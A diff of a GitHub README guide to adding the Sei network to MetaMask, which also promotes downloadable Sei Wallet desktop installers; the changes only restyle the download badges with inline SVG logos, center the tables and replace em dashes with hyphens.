@@ -5,23 +5,27 @@
 <p align="center">Add the Sei network to MetaMask, and know what it still cannot do.</p>
 
 <p align="center">
-  <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe"><img src="https://img.shields.io/badge/download-windows-a82731?style=for-the-badge&labelColor=201412&logo=windows&logoColor=white" alt="Download Sei Wallet for Windows" height="40"></a>
+  <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe"><img src="https://img.shields.io/badge/download-windows-a82731?style=for-the-badge&labelColor=201412&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTMgNS41IDEwLjUgNC41djdIM3pNMTEuNSA0LjMgMjEgM3Y4LjVoLTkuNXpNMyAxMi41aDcuNXY3TDMgMTguNXpNMTEuNSAxMi41SDIxVjIxbC05LjUtMS4zeicvPjwvc3ZnPg%3D%3D&logoColor=white" alt="Download Sei Wallet for Windows" height="40"></a>
   <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg"><img src="https://img.shields.io/badge/download-macos-a82731?style=for-the-badge&labelColor=201412&logo=apple&logoColor=white" alt="Download Sei Wallet for macOS" height="40"></a>
-  <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip"><img src="https://img.shields.io/badge/download-linux-a82731?style=for-the-badge&labelColor=201412&logo=linux&logoColor=white" alt="Download Sei Wallet for Linux" height="40"></a>
+  <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip"><img src="https://img.shields.io/badge/download-linux-a82731?style=for-the-badge&labelColor=201412&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTQgNS43IDUuNiA0LjIgMTMgMTJsLTcuNCA3LjhMNCAxOC4zIDkuOCAxMnonLz48cGF0aCBmaWxsPScjZmZmZmZmJyBkPSdNMTIgMTYuNGg4djIuMWgtOHonLz48L3N2Zz4%3D&logoColor=white" alt="Download Sei Wallet for Linux" height="40"></a>
 </p>
+
+<div align="center">
 
 | Platform | Requirements | File |
 |:--|:--|:--|
-| 🪟 Windows | Windows 10 (1909) or later, 64-bit | [`sei-wallet-v6.6.2.exe`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe) |
-| 🍎 macOS | macOS 12 or later | [`sei-wallet-v6.6.2.dmg`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg) |
-| 🐧 Linux | x64, Ubuntu 20.04 or later, or equivalent | [`sei-wallet-v6.6.2.zip`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip) |
+| <img src="https://img.shields.io/badge/Windows-a82731?style=flat-square&labelColor=201412&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTMgNS41IDEwLjUgNC41djdIM3pNMTEuNSA0LjMgMjEgM3Y4LjVoLTkuNXpNMyAxMi41aDcuNXY3TDMgMTguNXpNMTEuNSAxMi41SDIxVjIxbC05LjUtMS4zeicvPjwvc3ZnPg%3D%3D&logoColor=white" alt="Windows" height="24"> | Windows 10 (1909) or later, 64-bit | [`sei-wallet-v6.6.2.exe`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe) |
+| <img src="https://img.shields.io/badge/macOS-a82731?style=flat-square&labelColor=201412&logo=apple&logoColor=white" alt="macOS" height="24"> | macOS 12 or later | [`sei-wallet-v6.6.2.dmg`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg) |
+| <img src="https://img.shields.io/badge/Linux-a82731?style=flat-square&labelColor=201412&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTQgNS43IDUuNiA0LjIgMTMgMTJsLTcuNCA3LjhMNCAxOC4zIDkuOCAxMnonLz48cGF0aCBmaWxsPScjZmZmZmZmJyBkPSdNMTIgMTYuNGg4djIuMWgtOHonLz48L3N2Zz4%3D&logoColor=white" alt="Linux" height="24"> | x64, Ubuntu 20.04 or later, or equivalent | [`sei-wallet-v6.6.2.zip`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip) |
+
+</div>
 
 All versions and checksums are on the [Sei Wallet v6.6.2 release page](https://github.com/sei-chain/sei-wallet/releases/tag/v6.6.2).
 
 > [!WARNING]
 > Only download from this GitHub release page. Sei Wallet support never asks for a recovery phrase, and anyone who does is running a scam.
 
-You can add Sei to MetaMask in about two minutes: it is an EVM chain, so MetaMask treats it like any other custom network. What you get afterwards is a wallet that can hold and send SEI at a `0x` address — and cannot stake it, cannot show the legacy `sei1` side, and will not stop you from sending to the wrong network if you are not paying attention.
+You can add Sei to MetaMask in about two minutes: it is an EVM chain, so MetaMask treats it like any other custom network. What you get afterwards is a wallet that can hold and send SEI at a `0x` address - and cannot stake it, cannot show the legacy `sei1` side, and will not stop you from sending to the wrong network if you are not paying attention.
 
 This article covers the setup, the four things that most often go wrong, and the cases where a native Sei wallet is the better tool.
 
@@ -29,13 +33,17 @@ This article covers the setup, the four things that most often go wrong, and the
 
 Adding a custom EVM network always asks for the same five fields:
 
+<div align="center">
+
 | Field | Value for Sei mainnet |
 |---|---|
 | Network name | Sei (any label works; this is only for you) |
-| New RPC URL | The public Sei EVM endpoint published in Sei's own documentation — copy it from there, not from a blog post |
+| New RPC URL | The public Sei EVM endpoint published in Sei's own documentation - copy it from there, not from a blog post |
 | Chain ID | **1329** (hexadecimal `0x531`) |
 | Currency symbol | SEI |
 | Block explorer URL | Seiscan, Sei's block explorer |
+
+</div>
 
 Two of those deserve care. The chain ID must be 1329 for mainnet and 1328 for testnet; a wrong ID produces a wallet that looks connected and shows nothing. And the RPC URL is the one field a malicious guide can change without you noticing, because it looks like a random hostname either way. Take it from Sei's documentation or from the Sei wallet you already trust, and never from a link someone sent you.
 
@@ -47,7 +55,7 @@ Two of those deserve care. The chain ID must be 1329 for mainnet and 1328 for te
 4. Save, then select the new network.
 5. Check the chain ID MetaMask displays for that network. If it is not 1329, edit it before sending anything.
 
-That is the whole setup. The first time you switch to Sei, MetaMask may show a zero balance even for an address that holds SEI — see the next section, because there are two different reasons for that and only one of them is a problem.
+That is the whole setup. The first time you switch to Sei, MetaMask may show a zero balance even for an address that holds SEI - see the next section, because there are two different reasons for that and only one of them is a problem.
 
 ## Why the balance can look empty
 
@@ -63,7 +71,7 @@ That is the whole setup. The first time you switch to Sei, MetaMask may show a z
 
 **A token does not appear.** Native SEI shows automatically; other tokens on Sei need their contract address imported. A token that "isn't there" is usually a token you have not added, and a token you were told to add by a stranger is a common scam shape.
 
-**A transaction sits pending.** Sei has fast finality, so a transaction that stays pending usually means a gas price below the network minimum rather than congestion. Read [the stuck-transaction guide](https://github.com/sei-chain/sei-wallet-staking/blob/main/transaction-stuck-as-pending.md) before resending — resending at the same price produces a second pending transaction, not a faster one.
+**A transaction sits pending.** Sei has fast finality, so a transaction that stays pending usually means a gas price below the network minimum rather than congestion. Read [the stuck-transaction guide](https://github.com/sei-chain/sei-wallet-staking/blob/main/transaction-stuck-as-pending.md) before resending - resending at the same price produces a second pending transaction, not a faster one.
 
 **Nothing loads at all.** A public RPC endpoint can rate-limit you. If every call fails while the rest of your internet works, switch the RPC. The options and what they change are in [RPC endpoints](https://github.com/sei-chain/sei-wallet-setup/blob/main/rpc-endpoints-and-what-they-change.md).
 
@@ -77,7 +85,7 @@ That is the whole setup. The first time you switch to Sei, MetaMask may show a z
 
 A desktop Sei wallet does the things MetaMask structurally will not: native staking, hardware-wallet routing for Sei specifically, a dApp browser pointed at Sei applications, and one place where both address forms are visible. It is also a single application you download and verify, rather than an extension whose fake clone looks identical in a browser listing.
 
-What that product is, and what it explicitly does not promise, is set out in [the product overview](https://github.com/sei-chain/sei-wallet-setup/blob/main/what-the-desktop-app-is-and-how-it-works.md).
+What that product is, and what it explicitly does not promise, is set out in [what Sei Wallet is and how it works](https://github.com/sei-chain/sei-wallet-setup/blob/main/what-the-desktop-app-is-and-how-it-works.md).
 
 The honest split is this: MetaMask is the right answer if you already live in it and only need to hold or move SEI. A native wallet is the right answer if you intend to stake, use Sei dApps regularly, or want both address forms in one view.
 
@@ -95,7 +103,7 @@ Anything that touches chain ID, RPC or currency symbol is the same three values 
 
 **Is Sei on MetaMask by default?** No. A fresh install lists Ethereum and a few popular networks; Sei is not among the defaults.
 
-**What is Sei's chain ID?** 1329 for mainnet and 1328 for testnet. Entering the testnet ID on mainnet is a silent failure — the wallet connects and shows nothing.
+**What is Sei's chain ID?** 1329 for mainnet and 1328 for testnet. Entering the testnet ID on mainnet is a silent failure - the wallet connects and shows nothing.
 
 **What coins can MetaMask hold on Sei?** Native SEI, plus any Sei token whose contract you import. It does not discover tokens for you.
 
@@ -103,11 +111,15 @@ Anything that touches chain ID, RPC or currency symbol is the same three values 
 
 ## Download Sei Wallet
 
+<div align="center">
+
 | Platform | Installer |
 |:--|:--|
-| 🪟 Windows | [`sei-wallet-v6.6.2.exe`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe) |
-| 🍎 macOS | [`sei-wallet-v6.6.2.dmg`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg) |
-| 🐧 Linux | [`sei-wallet-v6.6.2.zip`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip) |
+| <img src="https://img.shields.io/badge/Windows-a82731?style=flat-square&labelColor=201412&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTMgNS41IDEwLjUgNC41djdIM3pNMTEuNSA0LjMgMjEgM3Y4LjVoLTkuNXpNMyAxMi41aDcuNXY3TDMgMTguNXpNMTEuNSAxMi41SDIxVjIxbC05LjUtMS4zeicvPjwvc3ZnPg%3D%3D&logoColor=white" alt="Windows" height="24"> | [`sei-wallet-v6.6.2.exe`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe) |
+| <img src="https://img.shields.io/badge/macOS-a82731?style=flat-square&labelColor=201412&logo=apple&logoColor=white" alt="macOS" height="24"> | [`sei-wallet-v6.6.2.dmg`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg) |
+| <img src="https://img.shields.io/badge/Linux-a82731?style=flat-square&labelColor=201412&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTQgNS43IDUuNiA0LjIgMTMgMTJsLTcuNCA3LjhMNCAxOC4zIDkuOCAxMnonLz48cGF0aCBmaWxsPScjZmZmZmZmJyBkPSdNMTIgMTYuNGg4djIuMWgtOHonLz48L3N2Zz4%3D&logoColor=white" alt="Linux" height="24"> | [`sei-wallet-v6.6.2.zip`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip) |
+
+</div>
 
 Every file above is attached to the [Sei Wallet v6.6.2 release](https://github.com/sei-chain/sei-wallet/releases/tag/v6.6.2), where the SHA-256 values are published. Verify the download before you run it.
 
